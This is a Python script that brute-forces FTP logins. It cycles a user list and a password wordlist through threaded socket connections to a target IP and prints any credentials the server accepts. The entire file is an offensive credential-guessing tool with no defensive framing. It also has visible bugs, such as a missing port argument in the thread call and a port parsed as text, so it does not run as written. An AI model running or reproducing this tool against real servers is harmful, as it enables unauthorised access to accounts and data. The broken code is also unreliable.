import re
import socket
import threading
import argparse
from time import sleep

found = False

def argparser() -> argparse.Namespace:
    parser = argparse.ArgumentParser()

    try:
        parser.add_argument("ip", type=str, help="IP to scan")
        parser.add_argument("-usr", "--user_file", type=str, help="Path to the users list")
        parser.add_argument("-pwd", "--passwd_file", type=str, help="Path to the passwd wordlist")
        parser.add_argument("-sp", "--service_port", type=str, help="Port of the FTP server")
    except argparse.ArgumentError as e:
        print(e)

    return parser.parse_args()

def crack(ip: str, user: str, passwd: str, port: int) -> None:
    global found
    instruct = {
        "set_user": f"USER {user}\r\n",
        "set_passwd": f"PASS {passwd}\r\n",
        "quit": f"QUIT\r\n"
    }
    
    try:
        #sleep(1)
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        skt.connect((ip, port))
        skt.recv(1024)

        ## Sent "set user" instruction
        skt.send(instruct["set_user"].encode("utf-8"))
        skt.recv(1024)

        ## Send "set password" instruction
        skt.send(instruct["set_passwd"].encode("utf-8"))
        result = skt.recv(1024).decode("utf-8")

        ## Send "end connection" instruction
        skt.send(instruct["quit"].encode("utf-8"))
        skt.recv(1024)

        if re.search("230", result):
            print(f"\n>>>>>> FOUND VALID CREDENTIALS <<<<<<\n")
            print(f"USER: {user}")
            print(f"PASS: {passwd}")
            print(f"\n#####################################\n")
            found = True
        #else:
         #   print(f">> tried USER {user} PASS {passwd}")
    except Exception as e:
        print(f">> tried USER {user} PASS {passwd}")
        print(f">> PROBLEM {e}")
    finally:
        skt.close()

def get_ftp_credentials(ip: str, user_list: str, passwd_list: str,  port: int) -> None:
    global found
    threads = []

    with open(user_list) as user_list, open(passwd_list) as passwd_list:
        users = [user.rstrip("\n") for user in user_list.readlines()]
        passwds = [passwd.rstrip("\n") for passwd in passwd_list.readlines()]
    
    for user in users:
        for i, passwd in enumerate(passwds, 1):
            ## adding and running threads
            print(f">> trying USER {user} PASS {passwd}")
            t = threading.Thread(target=crack, kwargs={"ip": ip, "user": user, "passwd": passwd})
            threads.append(t)
            t.start()
            
            sleep(0.1) ## Small delay to avoid "timed out" errors
            
            if len(threads) == 10 or i == len(passwds): ## Limiting threads running at the same time to avoid "timed out" errors
                for t in threads:
                    t.join()
                del threads[:]
            
            if found:
                break
        else:
            continue
        break

def main() -> None:
    args= argparser()
    print(">> checking credentials...")
    get_ftp_credentials(args.ip, args.user_file, args.passwd_file, args.service_port)

if __name__ == "__main__":
    main()